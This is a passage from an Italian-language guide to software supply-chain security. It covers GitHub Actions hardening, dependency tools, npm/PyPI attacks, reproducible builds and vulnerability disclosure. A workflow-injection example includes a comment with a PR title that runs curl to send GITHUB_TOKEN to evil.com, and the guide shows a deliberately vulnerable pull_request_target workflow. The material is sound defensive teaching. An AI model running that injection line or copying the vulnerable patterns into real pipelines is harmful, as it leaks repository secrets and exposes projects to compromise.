  packages: write

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build and push image
        id: push
        uses: docker/build-push-action@v6
        with:
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.ref_name }}

      - name: Generate artifact attestation
        uses: actions/attest-build-provenance@v2
        with:
          subject-name: ghcr.io/${{ github.repository }}
          subject-digest: ${{ steps.push.outputs.digest }}
          push-to-registry: true

      - name: Generate SBOM attestation
        uses: actions/attest-sbom@v2
        with:
          subject-name: ghcr.io/${{ github.repository }}
          subject-digest: ${{ steps.push.outputs.digest }}
          sbom-path: sbom.cdx.json
          push-to-registry: true
```

**Verifica delle attestazioni GitHub:**

```bash
# Verifica con GitHub CLI
gh attestation verify oci://ghcr.io/myorg/myapp:v1.0.0 \
  --owner myorg

# Verifica con cosign (le attestazioni sono compatibili sigstore)
cosign verify-attestation \
  --type slsaprovenance \
  --certificate-identity-regexp 'https://github.com/myorg/.*' \
  --certificate-oidc-issuer 'https://token.actions.githubusercontent.com' \
  ghcr.io/myorg/myapp@sha256:abc123...
```

### Workflow injection — il rischio degli input non sanitizzati

Una delle vulnerabilita piu comuni in GitHub Actions e la workflow injection: l'inserimento di codice eseguibile tramite input controllati dall'attaccante (titolo issue, corpo PR, commento) nelle espressioni `${{ }}` all'interno di blocchi `run:`.

```yaml
# VULNERABILE — injection tramite titolo della PR
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "PR title: ${{ github.event.pull_request.title }}"
          # Un attaccante crea una PR con titolo:
          # "fix: bug"; curl https://evil.com/exfil?token=$GITHUB_TOKEN; echo "

# SICURO — usare variabile d'ambiente
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "PR title: ${PR_TITLE}"
          # La variabile d'ambiente non viene interpretata come codice
```

**Input pericolosi da non usare mai in `run:` direttamente:**

```
github.event.issue.title
github.event.issue.body
github.event.pull_request.title
github.event.pull_request.body
github.event.comment.body
github.event.review.body
github.event.discussion.title
github.event.discussion.body
github.head_ref
```

### pull_request_target — il trigger piu pericoloso

Il trigger `pull_request_target` esegue il workflow nel contesto del branch base (non del fork), con accesso ai secret del repository. Se combinato con `actions/checkout` che fa checkout del codice della PR (dal fork), l'attaccante puo eseguire codice arbitrario con accesso ai secret:

```yaml
# PERICOLOSO — checkout del codice del fork con accesso ai secret
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.ref }}
          repository: ${{ github.event.pull_request.head.repo.full_name }}
      - run: npm test   # esegue codice del fork con secret disponibili

# SICURO — se serve pull_request_target, non fare checkout del fork
# oppure usare un workflow a due fasi (build senza secret, deploy con secret)
```

### Protezione dei self-hosted runner

I self-hosted runner rappresentano un rischio significativo se non configurati correttamente. A differenza dei runner hosted da GitHub (ephemeral per design), i self-hosted runner possono mantenere stato tra i job:

```
Rischi dei self-hosted runner non-ephemeral:
├── Malware persistente installato da un job precedente
├── Credenziali lasciate nel filesystem
├── Variabili d'ambiente con secret residui
├── Tool modificati nel PATH (es. git, docker compromessi)
└── Cache avvelenata tra job di progetti diversi

Mitigazioni:
├── Usare runner ephemeral (--ephemeral flag)
├── Eseguire runner in container o VM usa-e-getta
├── Non assegnare runner a fork pubblici
├── Separare runner per ambiente (staging vs production)
├── Non condividere runner tra organizzazioni
└── Monitorare l'integrita del runner con attestazioni
```

### Checklist di sicurezza per GitHub Actions

```
Pre-merge review obbligatorio per .github/workflows/**
├── [ ] Tutte le action pinnate al SHA completo
├── [ ] Nessun uso di pull_request_target con checkout del PR
├── [ ] Input sanitizzato (no ${{ github.event.*.body }} in run:)
├── [ ] Secret mai esposti nei log (no echo $SECRET)
├── [ ] GITHUB_TOKEN con permessi minimi (contents: read)
├── [ ] OIDC trust policy con claim granulari
├── [ ] Self-hosted runner ephemeral (se usati)
├── [ ] Artifact upload con retention-days limitato
├── [ ] Reusable workflow per build condivisi
└── [ ] Dependabot/Renovate per aggiornamento action
```

---

## Gestione delle dipendenze e sicurezza

### Il problema della gestione delle dipendenze

Le dipendenze software rappresentano la superficie d'attacco piu ampia della supply chain moderna. Un'applicazione Node.js media ha centinaia di dipendenze transitive, ognuna delle quali e un potenziale vettore di compromissione. La gestione della sicurezza delle dipendenze richiede tre attivita distinte:

1. **Aggiornamento:** mantenere le dipendenze aggiornate per ricevere patch di sicurezza.
2. **Rilevamento vulnerabilita:** identificare CVE note nelle dipendenze correnti.
3. **Rilevamento comportamentale:** identificare dipendenze malevole che non hanno ancora un CVE.

### Confronto tra strumenti

| Aspetto | Dependabot | Renovate | Socket.dev |
|---|---|---|---|
| **Tipo** | Updater + SCA base | Updater avanzato | Analisi comportamentale |
| **Piattaforme** | Solo GitHub | GitHub, GitLab, Bitbucket, Azure DevOps, Gitea | GitHub, npm CLI |
| **Ecosistemi** | 30+ package manager | 90+ package manager | npm, PyPI (primari) |
| **Grouping PR** | Limitato (security updates grouped) | Avanzato (per monorepo, regex, schedule) | N/A (non genera PR) |
| **Automerge** | No nativo | Si, con regole configurabili | N/A |
| **Approccio sicurezza** | CVE matching (GitHub Advisory DB) | CVE matching (delegato a tool esterni) | Analisi comportamentale del codice |
| **Lock file update** | Si | Si | Verifica in pre-install |
| **Costo** | Gratuito su GitHub | Gratuito (self-hosted o Mend cloud) | Free tier + piano enterprise |
| **Configurazione** | `dependabot.yml` nel repo | `renovate.json` nel repo | Dashboard + GitHub App |

### Dependabot — Configurazione avanzata

```yaml
# .github/dependabot.yml — configurazione production-grade
version: 2
updates:
  # Dipendenze applicative
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
      time: "06:00"
      timezone: "Europe/Rome"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"
    labels:
      - "dependencies"
      - "security"
    # Raggruppare aggiornamenti minor e patch
    groups:
      production-deps:
        patterns:
          - "*"
        update-types:
          - "minor"
          - "patch"
    # Ignorare major updates per librerie critiche (gestire manualmente)
    ignore:
      - dependency-name: "express"
        update-types: ["version-update:semver-major"]

  # GitHub Actions
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    groups:
      actions:
        patterns:
          - "*"

  # Container base images
  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"
```

### Renovate — Configurazione avanzata

```json5
// renovate.json — configurazione per monorepo con automerge
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": [
    "config:recommended",
    "security:openssf-scorecard",
    ":pinAllExceptPeerDependencies",
    "helpers:pinGitHubActionDigests"
  ],
  "schedule": ["before 7am on Monday"],
  "timezone": "Europe/Rome",
  "labels": ["dependencies"],
  "prConcurrentLimit": 5,
  "packageRules": [
    {
      "description": "Automerge patch updates per dipendenze non critiche",
      "matchUpdateTypes": ["patch"],
      "matchPackagePatterns": ["*"],
      "excludePackagePatterns": ["^express", "^fastify", "^pg"],
      "automerge": true,
      "automergeType": "pr",
      "platformAutomerge": true
    },
    {
      "description": "Raggruppare tutti gli aggiornamenti ESLint",
      "matchPackagePatterns": ["^eslint", "^@typescript-eslint"],
      "groupName": "eslint"
    },
    {
      "description": "Pin GitHub Actions ai digest SHA",
      "matchManagers": ["github-actions"],
      "pinDigests": true
    },
    {
      "description": "Aggiornare base image Docker settimanalmente",
      "matchManagers": ["dockerfile"],
      "schedule": ["before 5am on Tuesday"]
    }
  ],
  "vulnerabilityAlerts": {
    "enabled": true,
    "labels": ["security"],
    "assignees": ["@security-team"]
  }
}
```

### Socket.dev — Analisi comportamentale

Socket.dev opera su un piano diverso rispetto a Dependabot e Renovate. Invece di confrontare versioni con database CVE, analizza cosa fa effettivamente il codice delle dipendenze:

```
Analisi comportamentale Socket.dev:
├── Install scripts: esegue codice arbitrario durante npm install?
├── Network access: il pacchetto contatta endpoint esterni?
├── Filesystem operations: legge/scrive file sensibili?
├── Environment variables: accede a variabili d'ambiente?
├── Obfuscated code: contiene codice offuscato o minificato?
├── Maintainer changes: il maintainer e cambiato recentemente?
├── Typosquatting: il nome e simile a un pacchetto popolare?
└── Binary execution: include o scarica eseguibili binari?
```

**Integrazione Socket.dev in CI:**

```yaml
# GitHub Actions — Socket.dev security check
name: socket-check
on: [pull_request]

jobs:
  socket:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Socket Security
        uses: SocketDev/socket-security-action@v1
        with:
          # Blocca PR che introducono pacchetti con comportamento sospetto
          block-install-scripts: true
          block-network-access: true
          block-shell-access: true
```

### Strategia combinata di difesa delle dipendenze

La strategia ottimale combina tutti e tre gli approcci:

```
Layer 1: Renovate/Dependabot
  → Mantiene le dipendenze aggiornate
  → Patch di sicurezza applicate automaticamente
  → Pin GitHub Actions ai digest SHA

Layer 2: Vulnerability scanning (Trivy, Grype, Snyk)
  → Identifica CVE note nelle dipendenze correnti
  → Integrato nella pipeline CI/CD
  → Gate che blocca deploy con CVE critiche

Layer 3: Socket.dev (analisi comportamentale)
  → Rileva pacchetti malevoli prima che abbiano un CVE
  → Analisi pre-install degli script
  → Protezione contro typosquatting e maintainer compromise

Layer 4: SBOM + monitoraggio continuo
  → Dependency-Track per lifecycle management
  → Alerting su nuove CVE per dipendenze in produzione
  → VEX per documentare falsi positivi
```

---

## Attacchi alla supply chain npm e PyPI — Analisi approfondita

### Scala del fenomeno

I registri npm e PyPI sono i target primari per gli attacchi alla supply chain software. Nel 2024-2025, Sonatype ha identificato oltre 454.600 nuovi pacchetti malevoli, con il 99% concentrato su npm. Questa cifra rappresenta un aumento esponenziale rispetto agli anni precedenti e dimostra che gli attacchi ai registri pubblici sono diventati una tattica sistematica, non episodica.

**Distribuzione degli attacchi per registry:**

| Registry | Percentuale attacchi | Pacchetti malevoli 2024-2025 | Vettore primario |
|---|---|---|---|
| **npm** | ~70% | >300.000 | Typosquatting, dependency confusion |
| **PyPI** | ~20% | ~90.000 | Typosquatting, install script malevoli |
| **RubyGems** | ~5% | ~20.000 | Typosquatting |
| **Maven Central** | ~3% | ~10.000 | Namespace squatting |
| **crates.io** | ~2% | Pochi casi | Name squatting |

### Tassonomia degli attacchi ai registri

#### Typosquatting

L'attaccante pubblica un pacchetto con nome simile a uno popolare, sfruttando errori di digitazione:

```
Pacchetto legittimo    →  Typosquat
─────────────────────────────────────
requests               →  requets, reqeusts, request
colorama               →  colorama-py, coloramma
selenium               →  selemium, selennium
pytorch                →  pytoroch, py-torch
lodash                 →  lodashs, lodash-utils
```

Nel 2024, Checkmarx e Phylum hanno riportato la rimozione di centinaia di typosquat malevoli al mese da PyPI. I pacchetti contenevano tipicamente: credential stealer, cryptominer o reverse shell.

#### Slopsquatting (attacchi tramite dipendenze allucinati dall'AI)

Fenomeno emerso nel 2024-2025: i LLM generano codice che importa pacchetti inesistenti. Gli attaccanti registrano quei nomi sui registri pubblici, inserendovi codice malevolo. Quando uno sviluppatore esegue il codice generato dall'AI, installa il pacchetto malevolo.

```
Sviluppatore chiede al LLM: "come faccio X in Python?"
       │
       ▼
LLM genera: import flask_security_utils  (pacchetto inesistente)
       │
       ▼
Attaccante registra flask-security-utils su PyPI con malware
       │
       ▼
Sviluppatore esegue pip install flask-security-utils
       │
       ▼
Codice malevolo eseguito
```

**Mitigazione:**

- Verificare sempre l'esistenza e la reputazione di ogni pacchetto suggerito da un LLM.
- Controllare data di pubblicazione, numero di download, maintainer.
- Non installare mai pacchetti alla cieca dal codice generato.

#### Dependency confusion (namespace attack)

L'attaccante pubblica un pacchetto su un registry pubblico con lo stesso nome di un pacchetto interno privato, ma con versione superiore. Il package manager installa il pacchetto pubblico al posto di quello privato.

**Mitigazione per ecosistema:**

```bash
# npm — .npmrc con scope configurato
@mycompany:registry=https://npm.mycompany.io/
registry=https://registry.npmjs.org/
always-auth=true

# pip — pip.conf con index-url privato
[global]
index-url = https://pypi.mycompany.io/simple/
extra-index-url = https://pypi.org/simple/
# ATTENZIONE: extra-index-url e ancora vulnerabile
# Meglio: usare --no-deps + installare da requirements con hash

# Maven — settings.xml con mirror
<mirrors>
  <mirror>
    <id>internal</id>
    <mirrorOf>*</mirrorOf>
    <url>https://nexus.mycompany.io/repository/maven-public/</url>
  </mirror>
</mirrors>
```

#### Campagna MUT-8694 (ottobre 2024)

Campagna documentata da Datadog Security Labs che ha colpito sia npm che PyPI simultaneamente. Il pacchetto `larpexodus` su PyPI conteneva codice che scaricava ed eseguiva binari Windows da server esterni. Lo stesso downloader e stato trovato in pacchetti multipli su npm, indicando una campagna coordinata cross-registry.

**Caratteristiche della campagna:**

- Pacchetti pubblicati su entrambi i registri contemporaneamente.
- Codice malevolo nascosto in `setup.py` (PyPI) e `postinstall` script (npm).
- Target: sviluppatori Windows, finalita esfiltrazione credenziali.
- Binari scaricati da CDN legittimi per eludere il rilevamento.

### Mitigazioni a livello di registry

| Mitigazione | npm | PyPI |
|---|---|---|
| **2FA obbligatoria per maintainer** | Si (top-100 packages) | Si (critical projects) |
| **Trusted publishing (OIDC)** | In progress | Si (GitHub, GitLab) |
| **Malware detection automatico** | npm audit signatures | Malware checks |
| **Provenance attestation** | npm provenance (sigstore) | Trusted publishers attestation |
| **Rimozione rapida** | Report abuse | Report abuse |

#### Maintainer account takeover

Un vettore in crescita e il takeover di account di maintainer legittimi. L'attaccante ottiene accesso all'account npm o PyPI di un maintainer (tramite credential stuffing, phishing, o riuso di password compromesse) e pubblica una versione malevola del pacchetto originale.

**Caso notevole — ua-parser-js (ottobre 2021):**

Il maintainer del pacchetto `ua-parser-js` (7.8M download/settimana) e stato compromesso. L'attaccante ha pubblicato versioni con un cryptominer e un trojan per il furto di password. Il pacchetto e una dipendenza transitiva di progetti Facebook/Meta.

**Caso notevole — @solana/web3.js (dicembre 2024):**

Un attaccante ha ottenuto accesso all'account npm di un maintainer della libreria ufficiale Solana e ha pubblicato versioni contenenti codice per l'esfiltrazione di chiavi private dei wallet. L'attacco e stato rilevato entro poche ore ma ha comunque impattato migliaia di installazioni.

**Mitigazioni a livello di registro:**

- npm richiede 2FA per i top-100 pacchetti e per tutti i pacchetti con piu di 1M download/settimana.
- PyPI ha introdotto i "trusted publishers" basati su OIDC: il pacchetto puo essere pubblicato solo da un workflow GitHub specifico, eliminando la necessita di token API long-lived.
- npm supporta "provenance" basata su sigstore: `npm publish --provenance` genera un'attestazione che collega il pacchetto al workflow CI che lo ha prodotto.

```bash
# npm — verificare la provenance di un pacchetto
npm audit signatures
# Output:
# audited 1256 packages in 3s
# 1192 packages have verified registry signatures
# 64 packages have verified attestations

# PyPI — pubblicare con trusted publisher
# Non servono API token; il workflow GitHub si autentica via OIDC
# Configurazione: PyPI project settings → Trusted Publishers → Add
```

### Protezione lato consumatore

```bash
# 1. Usare lock file con hash di integrita
npm ci                          # usa package-lock.json, non npm install
pip install --require-hashes -r requirements.txt

# 2. Verificare npm provenance
npm audit signatures
# Mostra quali pacchetti hanno firme sigstore valide

# 3. Analizzare prima di installare
npm info <package> --json | jq '{name, version, maintainers, time}'
pip show <package>

# 4. Usare registry mirror con scanning
# Artifactory, Nexus, o Cloudsmith come proxy con scan automatico

# 5. Pin esatte delle versioni (no range)
# package.json: "lodash": "4.17.21"    (non "^4.17.0")
# requirements.txt: requests==2.32.3   (non requests>=2.0)
```

---

## Build riproducibili

### Perche i build riproducibili sono fondamentali

Un build riproducibile garantisce che dati gli stessi input (codice sorgente, dipendenze, configurazione), il processo di build produce output identici bit-per-bit. Questo e il requisito chiave di SLSA Level 4 e rappresenta la difesa piu forte contro la compromissione del build system.

**Se il build e riproducibile:**

- Chiunque puo ricostruire l'artefatto e verificare che corrisponda a quello distribuito.
- Un build system compromesso viene rilevato perche l'output differisce.
- La provenance diventa verificabile end-to-end.
- Si elimina il single point of failure del build system.

### Fonti di non-determinismo nei build

| Fonte | Esempio | Soluzione |
|---|---|---|
| **Timestamp** | Data di build in metadata, file headers | `SOURCE_DATE_EPOCH` |
| **Filesystem ordering** | `ls`/`find` non hanno ordine garantito | Sort esplicito |
| **Random data** | UUID generati durante il build | Seed deterministico |
| **Parallelismo** | Output dipende dall'ordine di esecuzione | Build single-threaded o output ordinato |
| **Path assoluti** | Path della working directory nel binario | `--remap-path-prefix` (Rust), `-ffile-prefix-map` (GCC) |
| **Archivi** | tar include uid/gid, timestamp dei file | `--sort=name --mtime=...` |
| **Timezone** | Fuso orario del build system | `TZ=UTC` |
| **Locale** | Sort order dipende dal locale | `LC_ALL=C` |

### SOURCE_DATE_EPOCH

`SOURCE_DATE_EPOCH` e la variabile d'ambiente standard per i build riproducibili. Definisce un timestamp Unix che il build system deve usare al posto del tempo corrente:

```bash
# Impostare SOURCE_DATE_EPOCH all'ultimo commit
export SOURCE_DATE_EPOCH=$(git log -1 --format=%ct)

# Usare con Docker
docker build \
  --build-arg SOURCE_DATE_EPOCH="${SOURCE_DATE_EPOCH}" \
  --no-cache \
  -t myapp:v1.0.0 .

# Usare con tar per archivi deterministici
tar --sort=name \
    --mtime="@${SOURCE_DATE_EPOCH}" \
    --owner=0 --group=0 --numeric-owner \
    -czf output.tar.gz src/
```

### Build riproducibili con Nix

Nix e il sistema piu maturo per i build riproducibili. Ogni build avviene in un ambiente isolato senza accesso alla rete, e le dipendenze sono identificate dal loro hash crittografico:

```nix
# flake.nix — build riproducibile di un'applicazione Go
{
  inputs = {
    nixpkgs.url = "github:NixOS/nixpkgs/nixos-24.11";
    flake-utils.url = "github:numtide/flake-utils";
  };

  outputs = { self, nixpkgs, flake-utils }:
    flake-utils.lib.eachDefaultSystem (system:
      let
        pkgs = nixpkgs.legacyPackages.${system};
      in {
        packages.default = pkgs.buildGoModule {
          pname = "myapp";
          version = "1.0.0";
          src = ./.;
          vendorHash = "sha256:xxx...";

          # Determinismo
          CGO_ENABLED = 0;
          ldflags = [
            "-s" "-w"
            "-X main.version=1.0.0"
            "-buildid="
          ];
        };
      });
}
```

```bash
# Verificare riproducibilita con Nix
nix build .#default
sha256sum result/bin/myapp
# Ricostruire su un'altra macchina → stesso hash
```

### Build riproducibili con Bazel

```python
# BUILD — regole Bazel per build hermetico
load("@rules_go//go:def.bzl", "go_binary")

go_binary(
    name = "myapp",
    srcs = ["main.go"],
    pure = "on",           # CGO disabilitato
    static = "on",         # Link statico
    gotags = ["netgo"],    # DNS resolver Go puro
    stamp = False,         # Nessun timestamp nel binario
)
```

```bash
# .bazelrc — configurazione per build hermetico
build --experimental_strict_action_env
build --sandbox_default_allow_network=false
build --incompatible_strict_action_env
build --noremote_accept_cached

# Verificare riproducibilita
bazel build //cmd/myapp:myapp
sha256sum bazel-bin/cmd/myapp/myapp_/myapp

bazel clean --expunge
bazel build //cmd/myapp:myapp
sha256sum bazel-bin/cmd/myapp/myapp_/myapp
# → stessi hash
```

### Container image riproducibili con apko

apko (di Chainguard) genera immagini OCI deterministiche senza Dockerfile, eliminando le fonti di non-determinismo tipiche dei build Docker:

```yaml
# apko.yaml — immagine riproducibile
contents:
  repositories:
    - https://dl-cdn.alpinelinux.org/alpine/v3.20/main
  packages:
    - alpine-base
    - curl
    - ca-certificates

entrypoint:
  command: /usr/bin/myapp

archs:
  - x86_64
  - aarch64

# apko produce immagini senza layer non necessari,
# con timestamp azzerati e ordine deterministico
```

```bash
# Build e verifica
apko build apko.yaml myapp:latest output.tar
sha256sum output.tar
# Ricostruire → stesso hash (date stesse versioni dei pacchetti)
```

### Verifica della riproducibilita con diffoscope

`diffoscope` e lo strumento di riferimento per confrontare due build e identificare le fonti di non-determinismo:

```bash
# Installare diffoscope
pip install diffoscope

# Confrontare due build dello stesso artefatto
diffoscope build1/myapp build2/myapp --html report.html

# Confrontare due container image
diffoscope image1.tar image2.tar --html report.html

# Output tipico per build non riproducibile:
# ├── usr/bin/myapp
# │   ├── .note.go.buildid differs
# │   └── .text: offset 0x1234: timestamps differ
# └── etc/os-release
#     └── BUILD_DATE differs
```

### Build riproducibili per container Docker

I build Docker tradizionali non sono riproducibili per design. Diverse fonti di non-determinismo impediscono la generazione di immagini identiche bit-per-bit:

```dockerfile
# Dockerfile NON riproducibile — fonti di non-determinismo evidenziate
FROM ubuntu:22.04
# 1. Tag mutabile: ubuntu:22.04 punta a digest diversi nel tempo
# 2. apt update scarica indici diversi in momenti diversi
RUN apt-get update && apt-get install -y curl
# 3. Timestamp dei file nei layer variano
COPY . /app
# 4. Metadata dell'immagine contiene timestamp di build
```

```dockerfile
# Dockerfile PIU riproducibile — mitigazioni applicate
# Pin al digest SHA256 della base image
FROM ubuntu@sha256:a1b2c3d4e5f6... AS base

# Pin delle versioni dei pacchetti
RUN apt-get update && apt-get install -y --no-install-recommends \
    curl=7.88.1-10ubuntu0.8 \
    ca-certificates=20230311ubuntu0.22.04.1 \
    && rm -rf /var/lib/apt/lists/*

# Usare SOURCE_DATE_EPOCH per timestamp deterministici
ARG SOURCE_DATE_EPOCH
ENV SOURCE_DATE_EPOCH=${SOURCE_DATE_EPOCH}

COPY . /app
```

**Strumenti per container riproducibili:**

| Strumento | Approccio | Riproducibilita |
|---|---|---|
| **Docker BuildKit** | Layer-based, Dockerfile | Parziale (con pin e attenzione) |
| **apko** (Chainguard) | Declarativo YAML, no Dockerfile | Alta (by design) |
| **Nix** (`dockerTools`) | Funzionale, dipendenze hashate | Molto alta |
| **ko** (Google) | Specifico per Go, no Dockerfile | Alta per applicazioni Go |
| **Buildpacks** (CNB) | Buildpack deterministici | Media-alta |

```bash
# ko — build riproducibile per applicazioni Go
# ko non usa Dockerfile, produce immagini minimali e deterministiche
KO_DOCKER_REPO=ghcr.io/myorg ko build ./cmd/myapp \
  --platform=linux/amd64,linux/arm64 \
  --sbom=cyclonedx \
  --bare

# Nix — dockerTools per immagini container
# La funzione buildImage di Nix produce immagini deterministiche
# perche Nix controlla ogni input del build
nix build .#dockerImage
docker load < result
```

### Stato attuale della riproducibilita (2025-2026)

Il progetto Reproducible Builds riporta progressi significativi:

- **Fedora Linux 45:** 90% di riproducibilita raggiunto con gli strumenti `add-determinism`, obiettivo 99% entro fine 2026.
- **Debian:** oltre 95% dei pacchetti riproducibili in bullseye/bookworm.
- **Alpine Linux:** la maggior parte dei pacchetti e riproducibile grazie alla toolchain musl.
- **Wolfi/Chainguard:** immagini container riproducibili by design con apko/melange.

---

## Vulnerability disclosure e risposta

### Struttura di un programma di vulnerability disclosure (VDP)

Un Vulnerability Disclosure Program (VDP) definisce il framework per la ricezione e gestione delle segnalazioni di vulnerabilita da parte di ricercatori di sicurezza. E un componente essenziale della postura di sicurezza della supply chain.

**Componenti fondamentali:**

```
VDP
├── Policy pubblica (scope, safe harbor, timeline)
├── Canali di comunicazione (security.txt, form web, email)
├── Processo di triage (PSIRT)
├── Coordinazione della remediation
├── Disclosure pubblica (advisory, CVE)
└── Riconoscimento e bug bounty (opzionale)
```

### security.txt (RFC 9116)

Il file `security.txt` e lo standard per indicare ai ricercatori di sicurezza come segnalare vulnerabilita:

```
# .well-known/security.txt
Contact: mailto:security@example.com
Contact: https://example.com/security/report
Encryption: https://example.com/.well-known/pgp-key.txt
Acknowledgments: https://example.com/security/hall-of-fame
Policy: https://example.com/security/disclosure-policy
Preferred-Languages: it, en
Canonical: https://example.com/.well-known/security.txt
Expires: 2027-01-01T00:00:00.000Z
```

### Product Security Incident Response Team (PSIRT)

Il PSIRT coordina l'intero ciclo di vita della risposta alle vulnerabilita:

```
Ricezione segnalazione
       │
       ▼
Acknowledgment (entro 3 giorni lavorativi)
       │
       ▼
Triage e valutazione (CVSS scoring)
       │
       ├── CRITICAL (9.0-10.0): patch entro 24-72 ore
       ├── HIGH (7.0-8.9): patch entro 7 giorni
       ├── MEDIUM (4.0-6.9): patch entro 30 giorni
       └── LOW (0.1-3.9): patch nel prossimo ciclo di release
       │
       ▼
Sviluppo e test della patch
       │
       ▼
Coordinazione con il ricercatore
       │
       ▼
Disclosure coordinata (advisory + CVE + patch)
       │
       ▼
Post-mortem e miglioramenti
```

### Timeline di disclosure coordinata

La pratica standard prevede una finestra di 90 giorni (Project Zero standard) o 120 giorni (CERT/CC) tra la segnalazione privata e la disclosure pubblica:

| Giorno | Azione |
|---|---|
| 0 | Ricercatore segnala la vulnerabilita |
| 0-3 | PSIRT conferma la ricezione |
| 3-7 | Triage: valutazione severita (CVSS), riproducibilita |
| 7-14 | Assegnazione CVE (se il vendor e CNA) |
| 14-60 | Sviluppo e test della patch |
| 60-80 | Coordinazione pre-disclosure con il ricercatore |
| 80-90 | Preparazione advisory e comunicazione |
| 90 | Disclosure pubblica: advisory + patch + CVE pubblicato |

### CVE Numbering Authority (CNA)

Un'organizzazione che gestisce software open source o prodotti commerciali dovrebbe considerare di diventare CNA per assegnare autonomamente CVE ID:

**Vantaggi di essere CNA:**

- Controllo diretto sulla timeline di assegnazione CVE.
- Non dipendere da MITRE per l'assegnazione (tempi piu rapidi).
- Maggiore credibilita nel processo di disclosure.
- Allineamento con le aspettative normative (CRA, NIS2).

**Requisiti per diventare CNA:**

- VDP pubblicato e funzionante.
- Processo documentato per triage e assegnazione.
- Capacita di pubblicare CVE record in formato CVE JSON 5.1.
- Impegno a rispettare le CNA Operational Rules.

### CSAF e advisory machine-readable

Il Common Security Advisory Framework (CSAF) e lo standard OASIS per la pubblicazione di advisory di sicurezza in formato machine-readable. Sostituisce il vecchio CVRF:

```json
{
  "document": {
    "category": "csaf_security_advisory",
    "title": "Critical vulnerability in myapp authentication module",
    "publisher": {
      "category": "vendor",
      "name": "MyOrg Security Team",
      "namespace": "https://example.com"
    },
    "tracking": {
      "id": "MYORG-2026-001",
      "initial_release_date": "2026-05-24T00:00:00Z",
      "current_release_date": "2026-05-24T00:00:00Z",
      "status": "final",
      "version": "1.0.0"
    }
  },
  "vulnerabilities": [
    {
      "cve": "CVE-2026-XXXXX",
      "title": "Authentication bypass via crafted JWT",
      "scores": [
        {
          "cvss_v3": {
            "baseScore": 9.8,
            "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
          }
        }
      ],
      "product_status": {
        "fixed": ["myapp:1.0.1"],
        "known_affected": ["myapp:1.0.0"]
      },
      "remediations": [
        {
          "category": "vendor_fix",
          "details": "Aggiornare a myapp 1.0.1 o successiva",
          "url": "https://example.com/releases/v1.0.1"
        }
      ]
    }
  ]
}
```

### VEX nel contesto del vulnerability disclosure

Il Vulnerability Exploitability eXchange (VEX) e un complemento essenziale al processo di vulnerability disclosure. Mentre un advisory CVE indica che una vulnerabilita esiste in un componente, il VEX indica se quella vulnerabilita e effettivamente sfruttabile nel contesto specifico del prodotto.

**Stati VEX:**

| Stato | Significato | Azione richiesta |
|---|---|---|
| `not_affected` | Il componente vulnerabile e presente ma il codice non e raggiungibile | Nessuna (documentare la giustificazione) |
| `affected` | La vulnerabilita e sfruttabile nel prodotto | Patch o mitigazione necessaria |
| `fixed` | La vulnerabilita e stata corretta | Aggiornare alla versione indicata |
| `under_investigation` | L'impatto e in fase di valutazione | Monitorare gli aggiornamenti |

**Pubblicazione VEX come attestazione:**

```bash
# Generare un documento VEX per vulnerabilita non sfruttabili
cat > vex.json <<'EOF'
{
  "@context": "https://openvex.dev/ns/v0.2.0",
  "@id": "https://example.com/vex/2026-001",
  "author": "security-team@example.com",
  "timestamp": "2026-05-24T00:00:00Z",
  "statements": [
    {
      "vulnerability": {
        "@id": "https://nvd.nist.gov/vuln/detail/CVE-2025-12345"
      },
      "products": [
        {"@id": "pkg:oci/myapp@sha256:abc123..."}
      ],
      "status": "not_affected",
      "justification": "vulnerable_code_not_in_execute_path",
      "impact_statement": "La funzione vulnerabile in libxml2 non e invocata dal nostro codice. Il parsing XML utilizza esclusivamente il modulo encoding/xml della standard library Go."
    }
  ]
}
EOF

# Allegare VEX come attestazione all'immagine
cosign attest --predicate vex.json \
  --type openvex \
  myregistry.io/myapp@sha256:abc123...
```

Il VEX riduce drasticamente il rumore dei vulnerability scanner, permettendo ai team di concentrarsi sulle vulnerabilita realmente sfruttabili invece di inseguire centinaia di CVE irrilevanti.

### Integrazione VDP nella supply chain

```
Supply chain security + VDP:

1. SBOM pubblicato → i consumatori sanno quali componenti usano
2. Ricercatore trova vulnerabilita in un componente
3. Segnala tramite VDP → PSIRT riceve
4. Patch sviluppata e testata
5. Advisory CSAF pubblicato con CVE
6. SBOM aggiornato → Dependency-Track alerta i consumatori
7. VEX pubblicato per componenti non affetti
8. Attestazione di vulnerability scan aggiornata nell'artefatto
```

---

## Verifica della build provenance — Approfondimento

### Verifica con slsa-verifier — Pattern avanzati

`slsa-verifier` e il tool ufficiale per verificare la provenance SLSA. Supporta artefatti generici, container image, e diversi builder (GitHub Actions, Google Cloud Build).

```bash
# Verifica di un artefatto generico con vincoli multipli
slsa-verifier verify-artifact myapp-linux-amd64 \
  --provenance-path provenance.intoto.jsonl \
  --source-uri github.com/myorg/myrepo \
  --source-tag v1.0.0 \
  --builder-id "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@refs/tags/v2.1.0"

# Verifica di container image con vincoli sul branch
slsa-verifier verify-image \
  ghcr.io/myorg/myapp@sha256:abc123... \
  --source-uri github.com/myorg/myrepo \
  --source-branch main \
  --builder-id "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@refs/tags/v2.1.0"

# Stampa della provenance verificata per ispezione
slsa-verifier verify-artifact myapp-linux-amd64 \
  --provenance-path provenance.intoto.jsonl \
  --source-uri github.com/myorg/myrepo \
  --print-provenance | jq .
```

### Verifica con GitHub CLI (gh attestation)

```bash
# Verificare un artefatto locale
gh attestation verify myapp-linux-amd64 \
  --owner myorg \
